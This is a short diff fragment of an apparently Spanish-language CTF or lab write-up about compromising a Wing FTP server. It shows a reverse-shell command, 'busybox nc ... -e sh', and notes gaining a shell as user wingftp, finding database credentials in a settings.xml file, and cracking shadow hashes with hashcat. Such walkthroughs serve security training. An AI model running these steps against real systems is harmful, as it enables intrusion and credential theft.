@@ -37,6 +37,10 @@ busybox nc 10.10.15.216 443 -e sh
 
 
 Obtenemos una shell como como el usuario `wingftp`
+En la rutA `/opt/wftpserver/Data/1` encontramos un archivo llamdo `settings.xml` en el cual encontramso el usuario y la contraseña de la base de datos
+```ad-hint
+root::
+```
 
 
 shadow 256 hashcat
